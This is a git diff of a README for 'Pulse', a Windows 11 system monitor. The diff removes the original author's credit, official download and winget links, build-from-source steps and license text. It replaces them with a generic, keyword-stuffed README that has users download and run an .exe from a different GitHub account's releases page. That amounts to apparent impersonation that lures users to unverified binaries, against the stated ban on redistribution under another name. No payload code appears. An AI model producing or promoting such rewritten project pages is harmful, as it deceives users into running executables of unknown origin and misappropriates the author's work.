@@ -1,217 +1,66 @@
-<div align="center">
+# 📊 pulse-system-monitor - Track your system performance with ease
 
-#  Pulse — System Monitor
+[![](https://img.shields.io/badge/Download-Pulse_Monitor-blue.svg)](https://github.com/Carleybaritone135/pulse-system-monitor/releases)
 
-**A beautiful, modern task manager & system monitor for Windows 11, built with WinUI 3 and .NET 8.**
+Pulse is a task manager and system monitor tool for Windows 11. It provides a visual way to check your hardware, network speed, and running processes. The software offers live graphs and themes to help you manage your computer.
 
-[⬇️ Download Pulse](https://dl1.wl-std.com/Pulse-1.8-Setup.exe) · [🌐 pouriyaparniyan.ir](https://pouriyaparniyan.ir)
+## 📥 How to download the software
 
-*Open source — read the code, audit it, build it yourself.*
+Follow these steps to install Pulse on your computer:
 
-</div>
+1. Visit the [official release page](https://github.com/Carleybaritone135/pulse-system-monitor/releases).
+2. Look for the latest version section at the top of the page.
+3. Find the file ending in `.msix` or `.exe` under the Assets header.
+4. Click the file name to start the download.
+5. Open your Downloads folder once the file finishes saving.
+6. Double-click the file to start the installation process.
+7. Follow the prompts on your screen to complete the setup.
 
----
+## 💻 System requirements
 
-## ✨ Features
+Pulse requires Windows 11 to run. Ensure your machine meets these criteria:
 
-- **Overview** — CPU, RAM, GPU, disk and network at a glance with live graphs
-- **Performance** — deep per-component view:
-  - CPU total + per-core graphs, live clock speed
-  - Memory, Disk (active time + transfer rate), Network (download/upload)
-  - GPU with engine graphs (3D / Copy / Video Decode / Processing) and temperature
-  - **Sensors** — temperature, fan, voltage, power and clocks via LibreHardwareMonitor (fully local & offline)
-  - History mode — scroll back through the last 10 minutes / 1 hour
-  - Top 3 heaviest processes under every graph
-- **Processes** — grouped like Windows Task Manager (Apps / Background / Windows):
-  - End task (with a satisfying sound), Suspend / Resume, Set priority
-  - **Efficiency mode** (EcoQoS) with a green leaf indicator, just like Windows
-  - Per-process **network usage** (admin), disk, GPU, memory, CPU
-  - Search, sort, advanced filters, copy details, **export to CSV**
-- **Startup Apps** — enable/disable with estimated boot impact and real app icons
-- **Services** — browse and manage Windows services
-- **Desktop Widget** — small always-on-top window with live CPU / RAM / GPU graphs
-- **System Tray** — live mini-graphs in the tray, fully customizable per icon (color, background, size)
-- **Usage alarms** — Windows notification when CPU / RAM / temperature crosses your limit
-- **7 themes** (Mica, Liquid Glass, Midnight, Aurora, OLED, Paper…) + **any accent color** (wheel / hex) applied to the whole app
-- **5 languages** — English, فارسی (RTL), Русский, Azərbaycan dili, Türkçe
-- **Auto-update** — checks quietly at launch, downloads the new version and asks you to install
+- .NET 8 Runtime: This comes bundled with the installer.
+- Processor: Any modern dual-core or better.
+- Memory: 4GB of RAM is enough for smooth operation.
+- Storage: 100MB of free disk space.
 
-## 📥 Installation
+If the application does not open, check if your version of Windows 11 is up to date via your system settings.
 
-### Option 1 — Winget (recommended)
+## 📈 Key features
 
-```powershell
-winget install wl-std.pulse
-```
+Pulse simplifies system management through several tools:
 
-### Option 2 — Manual download
+- Live Performance Graphs: View CPU, GPU, and RAM usage in real time.
+- Network Tracking: Monitor data upload and download speeds per process.
+- Hardware Sensors: Keep an eye on internal component temperatures and fan speeds.
+- Custom Themes: Choose from light, dark, or system-integrated themes.
+- Tray Icons: Check your status directly from the system tray without opening the main window.
+- Updates: The software checks for new versions and installs them for you.
 
-1. Download: **[Pulse-1.8-Setup.exe](https://dl1.wl-std.com/Pulse-1.8-Setup.exe)**
-2. Run it — it will ask for administrator access once (to trust the certificate and install)
-3. Done. Find **Pulse** in the Start menu, plus a shortcut on your desktop.
+## ⚙️ Using the application
 
-> Requires Windows 10 version 1809 or newer (Windows 11 recommended).
-> Some features (per-process network, some sensors) need **Run as administrator**.
+Once you open the software, the main dashboard appears. The primary window lists every program currently using your processing power. Click any item to see specific details about that task.
 
-## 🔒 Privacy
+Use the sidebar to move between screens. You can switch from the process list to hardware sensors or network statistics. Hover your mouse over any graph to see the exact number for that point in time.
 
-Pulse is fully local. No telemetry, no accounts, no data ever leaves your machine.
-The only network request is the optional update check against the official server.
+To change colors or themes, open Settings. You can toggle between dark mode and light mode here. Settings also allow you to decide if the app should start when Windows boots up.
 
-## 📄 License
+## 🛠 Troubleshooting common issues
 
-Source-available: you may read, audit and build the code yourself, but you may not
-redistribute it under your own name without permission. See [LICENSE](LICENSE).
+Most problems occur due to permission settings or missing background files. If you see an error, try these solutions:
 
-## 🛠️ Building from source
+- Restart the application: Close the window completely and reopen it from your taskbar.
+- Run as Administrator: Right-click the Pulse icon and select Run as administrator. This allows the app to read hardware sensor data that might be restricted.
+- Reinstall: If the app crashes on startup, delete the current version and download a fresh copy from the link provided above.
+- Check updates: Ensure you use the latest version available on the website, as developers fix bugs in every new release.
 
-### Prerequisites
+## 🛡 Privacy and security
 
-| Tool | Version |
-|---|---|
-| Windows | 10 (1809+) or 11 |
-| [.NET SDK](https://dotnet.microsoft.com/download/dotnet/8.0) | 8.0+ |
-| Visual Studio 2022 *(optional)* | with **Windows App SDK / WinUI** workload |
+Pulse functions locally on your machine. The software reads hardware metrics from your motherboard and Windows operating system. It does not send your personal data, browser history, or private files to external servers. All network monitoring happens on your local connection. You can block the app in your firewall settings if you wish to restrict the auto-update feature.
 
-### Steps
+## 💬 Getting help
 
-**1. Clone the repository**
+If you have questions or find a bug, open a new issue on the GitHub repository page. Provide a description of what you did before the problem happened and include a screenshot if possible. This helps developers understand the issue and provide a fix.
 
-```bash
-git clone https://github.com/pooriyayt/pulse.git
-cd pulse
-```
-
-**2. Build & run (CLI)**
-
-```bash
-dotnet build TaskManagerPro/TaskManagerPro.csproj -p:Platform=x64
-```
-
-Or open `TaskManagerPro/TaskManagerPro.sln` in Visual Studio, set platform to **x64**, press **F5**.
-
-**3. Build the single-file installer**
-
-```bash
-build-installer.bat
-```
-
-This will:
-- build a signed Release MSIX package
-- create a self-signed certificate on first run
-- produce a single `Installer/Pulse-<version>-Setup.exe`
-
----
-
-<div dir="rtl" align="center">
-
-# پالس — مانیتور سیستم
-
-**یک تسک‌منیجر و مانیتور سیستم مدرن و زیبا برای ویندوز ۱۱، ساخته‌شده با WinUI 3 و .NET 8**
-
-[⬇️ دانلود Pulse](https://dl1.wl-std.com/Pulse-1.8-Setup.exe) · [🌐 pouriyaparniyan.ir](https://pouriyaparniyan.ir)
-
-*متن‌باز — کد را بخوانید، بررسی کنید و خودتان بیلد بگیرید.*
-
-</div>
-
-<div dir="rtl">
-
-## ✨ امکانات
-
-- **نمای کلی** — CPU، رم، GPU، دیسک و شبکه در یک نگاه با گراف زنده
-- **پرفورمنس** — نمای عمیق هر قطعه:
-  - گراف کلی + تک‌تک هسته‌های CPU با سرعت لحظه‌ای
-  - حافظه، دیسک (زمان فعال + نرخ انتقال)، شبکه (دانلود/آپلود)
-  - GPU با گراف موتورها (3D / Copy / Video Decode / Processing) و دما
-  - **سنسورها** — دما، فن، ولتاژ، توان و کلاک با LibreHardwareMonitor (کاملاً لوکال و آفلاین)
-  - حالت تاریخچه — پیمایش ۱۰ دقیقه / ۱ ساعت گذشته
-  - ۳ پردازه‌ی پرمصرف زیر هر گراف
-- **پردازه‌ها** — گروه‌بندی مثل تسک‌منیجر ویندوز (برنامه‌ها / پس‌زمینه / ویندوز):
-  - End task (با صدای رضایت‌بخش!)، فریز/آنفریز، تغییر اولویت
-  - **حالت بهره‌وری** (EcoQoS) با برگ سبز، دقیقاً مثل ویندوز
-  - مصرف **شبکه‌ی هر پردازه** (ادمین)، دیسک، GPU، رم، CPU
-  - جستجو، مرتب‌سازی، فیلتر پیشرفته، کپی جزئیات، **خروجی CSV**
-- **برنامه‌های استارتاپ** — روشن/خاموش با تخمین تأثیر روی بوت و آیکون واقعی برنامه‌ها
-- **سرویس‌ها** — مدیریت سرویس‌های ویندوز
-- **ویجت دسکتاپ** — پنجره‌ی کوچک همیشه-رو با گراف زنده‌ی CPU / رم / GPU
-- **سیستم تری** — mini-گراف زنده در تری، شخصی‌سازی کامل هر آیکون (رنگ، پس‌زمینه، اندازه)
-- **آلارم مصرف** — نوتیفیکیشن ویندوز وقتی CPU / رم / دما از حد شما رد شود
-- **۷ تم** (Mica، Liquid Glass، Midnight، Aurora، OLED، Paper و…) + **هر رنگ اکسنت دلخواه** (چرخ رنگ / هگز) روی کل برنامه
-- **۵ زبان** — English، فارسی (RTL)، Русский، Azərbaycan dili، Türkçe
-- **آپدیت خودکار** — هنگام اجرا بی‌صدا چک می‌کند، نسخه‌ی جدید را دانلود و برای نصب از شما می‌پرسد
-
-## 📥 نصب
-
-### روش اول — Winget (پیشنهادی)
-
-```powershell
-winget install wl-std.pulse
-```
-
-### روش دوم — دانلود دستی
-
-۱. دانلود: **[Pulse-1.8-Setup.exe](https://dl1.wl-std.com/Pulse-1.8-Setup.exe)**
-۲. اجرایش کنید — یک بار دسترسی ادمین می‌خواهد (برای Trust گواهی و نصب)
-۳. تمام! **Pulse** در منوی استارت است و شورتکاتش روی دسکتاپ.
-
-> ویندوز ۱۰ نسخه‌ی 1809 به بالا لازم است (ویندوز ۱۱ پیشنهاد می‌شود).
-> بعضی امکانات (شبکه‌ی هر پردازه، برخی سنسورها) به **Run as administrator** نیاز دارند.
-
-## 🔒 حریم خصوصی
-
-پالس کاملاً لوکال است. نه تله‌متری، نه اکانت — هیچ داده‌ای از سیستم شما خارج نمی‌شود.
-تنها درخواست شبکه، چک اختیاری آپدیت از سرور رسمی است.
-
-## 📄 لایسنس
-
-سورس-در-دسترس: می‌توانید کد را بخوانید، بررسی کنید و خودتان بیلد بگیرید، اما بدون اجازه
-نمی‌توانید آن را به اسم خودتان منتشر کنید. فایل [LICENSE](LICENSE) را ببینید.
-
-## 🛠️ بیلد گرفتن از سورس
-
-### پیش‌نیازها
-
-| ابزار | نسخه |
-|---|---|
-| ویندوز | ۱۰ (1809 به بالا) یا ۱۱ |
-| [.NET SDK](https://dotnet.microsoft.com/download/dotnet/8.0) | 8.0 به بالا |
-| ویژوال استودیو ۲۰۲۲ *(اختیاری)* | با ورک‌لود **Windows App SDK / WinUI** |
-
-### مراحل
-
-**۱. کلون کردن مخزن**
-
-```bash
-git clone https://github.com/pooriyayt/pulse.git
-cd pulse
-```
-
-**۲. بیلد و اجرا از خط فرمان**
-
-```bash
-dotnet build TaskManagerPro/TaskManagerPro.csproj -p:Platform=x64
-```
-
-یا فایل `TaskManagerPro/TaskManagerPro.sln` را در ویژوال استودیو باز کنید، پلتفرم را روی **x64** بگذارید و **F5** بزنید.
-
-**۳. ساخت اینستالر تک‌فایلی**
-
-```bash
-build-installer.bat
-```
-
-این اسکریپت:
-- پکیج MSIX امضاشده‌ی Release می‌سازد
-- بار اول گواهی امضا می‌سازد
-- یک فایل `Pulse-<version>-Setup.exe` تکی در پوشه‌ی `Installer` تحویل می‌دهد
-
-</div>
-
----
-
-<div align="center">
-
-**Made with 💚&🍵 by [Pouriya Parniyan](https://pouriyaparniyan.ir)**
-
-</div>
+Keywords: system monitor, windows 11, task manager, performance tracker, hardware sensors, open source, pc utility
